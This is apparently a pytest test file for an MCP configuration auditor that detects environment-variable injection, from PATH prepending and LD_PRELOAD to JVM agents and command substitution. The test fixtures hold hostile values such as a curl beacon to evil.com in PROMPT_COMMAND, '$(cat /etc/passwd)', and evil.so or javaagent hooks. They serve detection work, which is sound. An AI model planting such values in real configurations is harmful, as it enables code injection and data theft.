"""Unit tests for the mcp_audit environment variable injection checker.

Tests cover:
- ENV-001: Suspicious directory prepended to PATH
- ENV-002: LD_PRELOAD / LD_LIBRARY_PATH injection
- ENV-003: PYTHONPATH / PYTHONSTARTUP injection
- ENV-004: NODE_OPTIONS / NODE_PATH injection
- ENV-005: DYLD_INSERT_LIBRARIES injection (macOS)
- ENV-006: Shell init file override (BASH_ENV, ENV, ZDOTDIR)
- ENV-007: Temp/world-writable path in environment variable values
- ENV-008: LD_AUDIT / LD_DEBUG injection
- ENV-009: Ruby/Perl interpreter injection
- ENV-010: JVM options injection
- ENV-011: Command substitution in environment variable values
- ENV-012: Multiple dangerous environment variables (amplified risk)
- check_file() with JSON MCP configs
- check_env_dict() direct API
- check_files() with multiple paths
- Raw text export statement detection
- Benign configurations that should NOT trigger findings
- Deduplication of findings
- Finding structure and serialization
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from mcp_audit.checks.env_injection import (
    _deduplicate_findings,
    check_env_dict,
    check_file,
    check_files,
)
from mcp_audit.models import Finding, Severity


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write(path: Path, content: str) -> Path:
    """Write text content to a file, creating parent directories as needed."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def _write_json(path: Path, data: Any) -> Path:
    """Serialize data as JSON and write to path."""
    return _write(path, json.dumps(data, indent=2))


def _check_ids(findings: list[Finding]) -> set[str]:
    """Extract all check IDs from a list of findings."""
    return {f.check_id for f in findings}


def _findings_for(check_id: str, findings: list[Finding]) -> list[Finding]:
    """Filter findings by check ID."""
    return [f for f in findings if f.check_id == check_id]


def _make_mcp_config(
    path: Path,
    servers: dict[str, Any] | None = None,
    extra: dict[str, Any] | None = None,
) -> Path:
    """Write a minimal MCP JSON config with optional server definitions."""
    data: dict[str, Any] = {"mcpServers": servers or {}}
    if extra:
        data.update(extra)
    return _write_json(path, data)


def _make_server_with_env(
    path: Path,
    env: dict[str, str],
    server_name: str = "test-server",
    command: str = "node",
    args: list[str] | None = None,
) -> Path:
    """Write an MCP config with a server definition that has env variables."""
    server_def: dict[str, Any] = {
        "command": command,
        "args": args or ["server.js"],
        "env": env,
    }
    return _make_mcp_config(path, servers={server_name: server_def})


# ---------------------------------------------------------------------------
# Tests: check_file() - file not found / empty / unreadable
# ---------------------------------------------------------------------------


class TestCheckFileEdgeCases:
    def test_nonexistent_file_returns_empty(self, tmp_path: Path) -> None:
        result = check_file(tmp_path / "nonexistent.json")
        assert result == []

    def test_empty_file_returns_empty_list(self, tmp_path: Path) -> None:
        p = _write(tmp_path / "empty.json", "")
        result = check_file(p)
        assert isinstance(result, list)

    def test_malformed_json_no_exception(self, tmp_path: Path) -> None:
        p = _write(tmp_path / "bad.json", "{ this is not valid json !!")
        result = check_file(p)
        assert isinstance(result, list)

    def test_directory_path_returns_empty(self, tmp_path: Path) -> None:
        result = check_file(tmp_path)
        assert result == []

    def test_non_json_file_returns_list(self, tmp_path: Path) -> None:
        p = _write(tmp_path / "config.txt", "export LD_PRELOAD=/tmp/evil.so")
        result = check_file(p)
        assert isinstance(result, list)

    def test_valid_empty_json_object(self, tmp_path: Path) -> None:
        p = _write_json(tmp_path / "mcp.json", {})
        result = check_file(p)
        assert isinstance(result, list)

    def test_json_array_at_root_no_exception(self, tmp_path: Path) -> None:
        p = _write_json(tmp_path / "mcp.json", [1, 2, 3])
        result = check_file(p)
        assert isinstance(result, list)

    def test_returns_list_of_findings(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/tmp/evil.so"},
        )
        result = check_file(p)
        assert isinstance(result, list)
        for item in result:
            assert isinstance(item, Finding)


# ---------------------------------------------------------------------------
# Tests: ENV-001 - Suspicious directory prepended to PATH
# ---------------------------------------------------------------------------


class TestEnv001PathPrepending:
    def test_relative_dot_prepended_to_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "./bin:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_tmp_prepended_to_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/tmp:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_parent_dir_traversal_in_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "../scripts:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_home_hidden_dir_prepended(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "$HOME/.local/bin:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_tilde_prepended_to_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "~/bin:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_var_tmp_in_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/var/tmp/tools:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_dev_shm_in_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/dev/shm/bin:/usr/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" in ids

    def test_env001_severity_is_critical(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/tmp:/usr/bin:/bin"},
        )
        findings = check_file(p)
        env001 = _findings_for("ENV-001", findings)
        assert len(env001) >= 1
        assert env001[0].severity == Severity.CRITICAL

    def test_env001_has_evidence(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/tmp:/usr/bin"},
        )
        findings = check_file(p)
        env001 = _findings_for("ENV-001", findings)
        assert len(env001) >= 1
        assert env001[0].evidence is not None
        assert "/tmp" in env001[0].evidence

    def test_env001_has_remediation(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/tmp:/usr/bin"},
        )
        findings = check_file(p)
        env001 = _findings_for("ENV-001", findings)
        assert len(env001) >= 1
        assert env001[0].remediation is not None
        assert len(env001[0].remediation) > 0

    def test_trusted_path_no_env001(self, tmp_path: Path) -> None:
        """PATH starting with trusted system directories should not trigger ENV-001."""
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/usr/local/bin:/usr/bin:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" not in ids

    def test_empty_path_value_no_env001(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": ""},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-001" not in ids

    def test_tmp_in_middle_of_path_flags_env007(self, tmp_path: Path) -> None:
        """A temp dir not at the start triggers ENV-007 not ENV-001."""
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PATH": "/usr/bin:/tmp/tools:/bin"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        # Not prepended, so ENV-001 should not fire, but ENV-007 might
        assert "ENV-001" not in ids
        assert "ENV-007" in ids

    def test_check_env_dict_path_direct(self, tmp_path: Path) -> None:
        """Direct call to check_env_dict with dangerous PATH."""
        findings = check_env_dict(
            {"PATH": "/tmp:/usr/bin"},
            file_path=tmp_path / "config.json",
            context="mcpServers.test.env",
        )
        ids = _check_ids(findings)
        assert "ENV-001" in ids


# ---------------------------------------------------------------------------
# Tests: ENV-002 - LD_PRELOAD / LD_LIBRARY_PATH injection
# ---------------------------------------------------------------------------


class TestEnv002LdPreload:
    def test_ld_preload_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/tmp/evil.so"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_ld_library_path_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_LIBRARY_PATH": "/tmp/mylibs"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_ld_preload_severity_is_critical(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/usr/lib/evil.so"},
        )
        findings = check_file(p)
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        assert env002[0].severity == Severity.CRITICAL

    def test_ld_preload_has_file_path(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/tmp/evil.so"},
        )
        findings = check_file(p)
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        assert env002[0].file_path == p

    def test_ld_preload_has_evidence(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/tmp/evil.so"},
        )
        findings = check_file(p)
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        assert env002[0].evidence is not None
        assert "LD_PRELOAD" in env002[0].evidence

    def test_ld_preload_has_remediation(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_PRELOAD": "/tmp/evil.so"},
        )
        findings = check_file(p)
        env002 = _findings_for("ENV-002", findings)
        assert len(env002) >= 1
        assert env002[0].remediation is not None
        assert len(env002[0].remediation) > 0

    def test_ld_audit_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_AUDIT": "/tmp/audit.so"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        # LD_AUDIT is a linker hijack var -> ENV-002
        assert "ENV-002" in ids

    def test_ld_debug_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"LD_DEBUG": "all"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_check_env_dict_ld_preload(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"LD_PRELOAD": "/usr/lib/fake.so"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-002" in ids

    def test_lowercase_var_name_also_detected(self, tmp_path: Path) -> None:
        """Variable names are case-insensitively matched."""
        # Our implementation checks var_upper so mixed case should still match
        findings = check_env_dict(
            {"LD_PRELOAD": "/evil.so"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-002" in ids


# ---------------------------------------------------------------------------
# Tests: ENV-003 - PYTHONPATH / PYTHONSTARTUP injection
# ---------------------------------------------------------------------------


class TestEnv003PythonInjection:
    def test_pythonpath_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONPATH": "/tmp/evil_modules"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_pythonstartup_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONSTARTUP": "/tmp/evil_startup.py"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_pythonhome_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONHOME": "/tmp/fake_python"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_pythonpath_severity_is_high(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONPATH": "/evil/modules"},
        )
        findings = check_file(p)
        env003 = _findings_for("ENV-003", findings)
        assert len(env003) >= 1
        assert env003[0].severity == Severity.HIGH

    def test_pythonuserbase_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONUSERBASE": "/tmp/user_base"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_check_env_dict_pythonpath(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"PYTHONPATH": "/malicious/path"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-003" in ids

    def test_env003_has_evidence(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PYTHONPATH": "/evil/path"},
        )
        findings = check_file(p)
        env003 = _findings_for("ENV-003", findings)
        assert len(env003) >= 1
        assert env003[0].evidence is not None
        assert "PYTHONPATH" in env003[0].evidence


# ---------------------------------------------------------------------------
# Tests: ENV-004 - NODE_OPTIONS / NODE_PATH injection
# ---------------------------------------------------------------------------


class TestEnv004NodeInjection:
    def test_node_options_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NODE_OPTIONS": "--require /tmp/hook.js"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_node_path_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NODE_PATH": "/tmp/node_modules"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_node_options_severity_is_high(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NODE_OPTIONS": "--inspect"},
        )
        findings = check_file(p)
        env004 = _findings_for("ENV-004", findings)
        assert len(env004) >= 1
        assert env004[0].severity == Severity.HIGH

    def test_npm_config_prefix_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NPM_CONFIG_PREFIX": "/tmp/npm_global"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_node_extra_ca_certs_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"NODE_EXTRA_CA_CERTS": "/tmp/evil_cert.pem"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-004" in ids

    def test_check_env_dict_node_options(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"NODE_OPTIONS": "--require /evil/hook.js"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-004" in ids


# ---------------------------------------------------------------------------
# Tests: ENV-005 - DYLD_INSERT_LIBRARIES (macOS)
# ---------------------------------------------------------------------------


class TestEnv005DyldInjection:
    def test_dyld_insert_libraries_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        # DYLD_INSERT_LIBRARIES is in the linker hijack vars -> ENV-002 or ENV-005
        assert ids & {"ENV-002", "ENV-005"}

    def test_dyld_library_path_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"DYLD_LIBRARY_PATH": "/tmp/evil_libs"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert ids & {"ENV-002", "ENV-005"}

    def test_dyld_framework_path_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"DYLD_FRAMEWORK_PATH": "/tmp/evil_frameworks"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert ids & {"ENV-002", "ENV-005"}

    def test_dyld_insert_libraries_is_critical(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"},
            file_path=tmp_path / "config.json",
        )
        # It's classified as CRITICAL (linker hijack)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1


# ---------------------------------------------------------------------------
# Tests: ENV-006 - Shell init file overrides
# ---------------------------------------------------------------------------


class TestEnv006ShellInitOverrides:
    def test_bash_env_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"BASH_ENV": "/tmp/evil_init.sh"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_env_var_detected(self, tmp_path: Path) -> None:
        """The bare ENV variable overrides sh initialization file."""
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"ENV": "/tmp/evil_sh_init"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_zdotdir_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"ZDOTDIR": "/tmp/evil_zsh_dir"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_prompt_command_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PROMPT_COMMAND": "curl http://evil.com/beacon"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-006" in ids

    def test_bash_env_severity_is_high(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"BASH_ENV": "/tmp/init.sh"},
        )
        findings = check_file(p)
        env006 = _findings_for("ENV-006", findings)
        assert len(env006) >= 1
        assert env006[0].severity == Severity.HIGH

    def test_bash_env_has_remediation(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"BASH_ENV": "/tmp/init.sh"},
        )
        findings = check_file(p)
        env006 = _findings_for("ENV-006", findings)
        assert len(env006) >= 1
        assert env006[0].remediation is not None

    def test_check_env_dict_bash_env(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"BASH_ENV": "/evil/init.sh"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-006" in ids


# ---------------------------------------------------------------------------
# Tests: ENV-007 - Temp/world-writable path in env var values
# ---------------------------------------------------------------------------


class TestEnv007TempPathInValue:
    def test_tmp_in_custom_var_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"MY_CONFIG_DIR": "/tmp/config"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-007" in ids

    def test_var_tmp_in_custom_var_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PLUGIN_DIR": "/var/tmp/plugins"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-007" in ids

    def test_tmpdir_env_var_in_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"CACHE_DIR": "$TMPDIR/mycache"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-007" in ids

    def test_env007_severity_is_medium(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_DIR": "/tmp/somedir"},
            file_path=tmp_path / "config.json",
        )
        env007 = _findings_for("ENV-007", findings)
        if env007:
            assert env007[0].severity == Severity.MEDIUM

    def test_path_var_with_tmp_uses_env007_not_repeated(self, tmp_path: Path) -> None:
        """Temp paths inside PATH (not at start) trigger ENV-007."""
        findings = check_env_dict(
            {"PATH": "/usr/bin:/tmp/tools:/bin"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-007" in ids
        # Should NOT be ENV-001 since /tmp is not at the start
        assert "ENV-001" not in ids

    def test_dev_shm_in_custom_var(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"SHARED_MEM_DIR": "/dev/shm/myapp"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-007" in ids

    def test_env007_has_evidence(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"WORK_DIR": "/tmp/work"},
            file_path=tmp_path / "config.json",
        )
        env007 = _findings_for("ENV-007", findings)
        if env007:
            assert env007[0].evidence is not None

    def test_stable_path_no_env007(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_DIR": "/usr/local/share/myapp"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-007" not in ids

    def test_already_dangerous_var_skips_env007(self, tmp_path: Path) -> None:
        """For already-dangerous vars like LD_PRELOAD, ENV-007 is not also triggered."""
        findings = check_env_dict(
            {"LD_PRELOAD": "/tmp/evil.so"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        # Should have ENV-002 for LD_PRELOAD, but NOT ENV-007 (it's skipped)
        assert "ENV-002" in ids
        assert "ENV-007" not in ids


# ---------------------------------------------------------------------------
# Tests: ENV-009 - Ruby/Perl interpreter injection
# ---------------------------------------------------------------------------


class TestEnv009RubyPerlInjection:
    def test_rubyopt_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"RUBYOPT": "-r/tmp/evil"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-009" in ids

    def test_rubylib_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"RUBYLIB": "/tmp/ruby_lib"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-009" in ids

    def test_perl5opt_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PERL5OPT": "-d:Trace"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-009" in ids

    def test_perllib_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PERLLIB": "/tmp/perl_modules"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-009" in ids

    def test_perl5lib_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"PERL5LIB": "/tmp/lib5"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-009" in ids

    def test_env009_severity_is_medium(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"RUBYOPT": "-r/evil"},
            file_path=tmp_path / "config.json",
        )
        env009 = _findings_for("ENV-009", findings)
        assert len(env009) >= 1
        assert env009[0].severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# Tests: ENV-010 - JVM options injection
# ---------------------------------------------------------------------------


class TestEnv010JavaInjection:
    def test_java_tool_options_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"JAVA_TOOL_OPTIONS": "-javaagent:/tmp/evil-agent.jar"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_java_options_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"_JAVA_OPTIONS": "-Xmx2g -javaagent:/evil.jar"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_jdk_java_options_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"JDK_JAVA_OPTIONS": "--add-opens java.base/java.lang=ALL-UNNAMED"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_java_opts_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"JAVA_OPTS": "-Djava.class.path=/tmp/evil"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_maven_opts_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"MAVEN_OPTS": "-javaagent:/evil.jar"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-010" in ids

    def test_env010_severity_is_medium(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"JAVA_TOOL_OPTIONS": "-javaagent:/evil.jar"},
            file_path=tmp_path / "config.json",
        )
        env010 = _findings_for("ENV-010", findings)
        assert len(env010) >= 1
        assert env010[0].severity == Severity.MEDIUM


# ---------------------------------------------------------------------------
# Tests: ENV-011 - Command substitution in environment variable values
# ---------------------------------------------------------------------------


class TestEnv011CommandSubstitution:
    def test_dollar_paren_in_env_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"API_KEY": "$(cat /etc/passwd)"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-011" in ids

    def test_backtick_in_env_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"SECRET": "`whoami`"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-011" in ids

    def test_process_substitution_in_env_value(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"CONFIG": "<(curl http://evil.com/config)"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-011" in ids

    def test_cmd_substitution_in_path_value(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"PATH": "$(echo /tmp):/usr/bin"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-011" in ids

    def test_env011_severity_is_critical(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_VAR": "$(evil_cmd)"},
            file_path=tmp_path / "config.json",
        )
        env011 = _findings_for("ENV-011", findings)
        assert len(env011) >= 1
        assert env011[0].severity == Severity.CRITICAL

    def test_env011_has_evidence(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_VAR": "$(evil_cmd)"},
            file_path=tmp_path / "config.json",
        )
        env011 = _findings_for("ENV-011", findings)
        assert len(env011) >= 1
        assert env011[0].evidence is not None
        assert "$(evil_cmd)" in env011[0].evidence

    def test_env011_has_remediation(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_VAR": "$(evil_cmd)"},
            file_path=tmp_path / "config.json",
        )
        env011 = _findings_for("ENV-011", findings)
        assert len(env011) >= 1
        assert env011[0].remediation is not None

    def test_static_value_no_env011(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {"MY_VAR": "/usr/local/share/myapp"},
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-011" not in ids

    def test_check_file_env011_detected(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={"CUSTOM": "$(get_secret)"},
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-011" in ids


# ---------------------------------------------------------------------------
# Tests: ENV-012 - Multiple dangerous environment variables
# ---------------------------------------------------------------------------


class TestEnv012MultipleDangerousVars:
    def test_three_dangerous_vars_triggers_env012(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/tmp/evil.so",
                "PYTHONPATH": "/tmp/evil_modules",
                "NODE_OPTIONS": "--require /tmp/hook.js",
            },
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-012" in ids

    def test_four_dangerous_vars_triggers_env012(self, tmp_path: Path) -> None:
        p = _make_server_with_env(
            tmp_path / "mcp.json",
            env={
                "LD_PRELOAD": "/tmp/evil.so",
                "PYTHONPATH": "/tmp/evil",
                "NODE_OPTIONS": "--inspect",
                "BASH_ENV": "/tmp/init.sh",
            },
        )
        findings = check_file(p)
        ids = _check_ids(findings)
        assert "ENV-012" in ids

    def test_env012_severity_is_critical(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/evil.so",
                "PYTHONPATH": "/evil",
                "NODE_OPTIONS": "--require /evil.js",
            },
            file_path=tmp_path / "config.json",
        )
        env012 = _findings_for("ENV-012", findings)
        assert len(env012) >= 1
        assert env012[0].severity == Severity.CRITICAL

    def test_two_dangerous_vars_no_env012(self, tmp_path: Path) -> None:
        """Fewer than 3 dangerous vars should NOT trigger ENV-012."""
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/evil.so",
                "PYTHONPATH": "/evil",
            },
            file_path=tmp_path / "config.json",
        )
        ids = _check_ids(findings)
        assert "ENV-012" not in ids

    def test_env012_has_extra_with_var_names(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/evil.so",
                "PYTHONPATH": "/evil",
                "NODE_OPTIONS": "--require /evil.js",
            },
            file_path=tmp_path / "config.json",
        )
        env012 = _findings_for("ENV-012", findings)
        assert len(env012) >= 1
        extra = env012[0].extra
        assert "dangerous_variables" in extra
        assert isinstance(extra["dangerous_variables"], list)
        assert len(extra["dangerous_variables"]) >= 3

    def test_env012_has_evidence(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/evil.so",
                "PYTHONPATH": "/evil",
                "NODE_OPTIONS": "--require /evil.js",
            },
            file_path=tmp_path / "config.json",
        )
        env012 = _findings_for("ENV-012", findings)
        assert len(env012) >= 1
        assert env012[0].evidence is not None

    def test_env012_has_remediation(self, tmp_path: Path) -> None:
        findings = check_env_dict(
            {
                "LD_PRELOAD": "/evil.so",
                "PYTHONPATH": "/evil",
                "NODE_OPTIONS": "--require /evil.js",
            },
            file_path=tmp_path / "config.json",
        )
        env012 = _findings_for("ENV-012", findings)
        assert len(env012) >= 1
        assert env012[0].remediation is not None
        assert len(env012[0].remediation) > 0


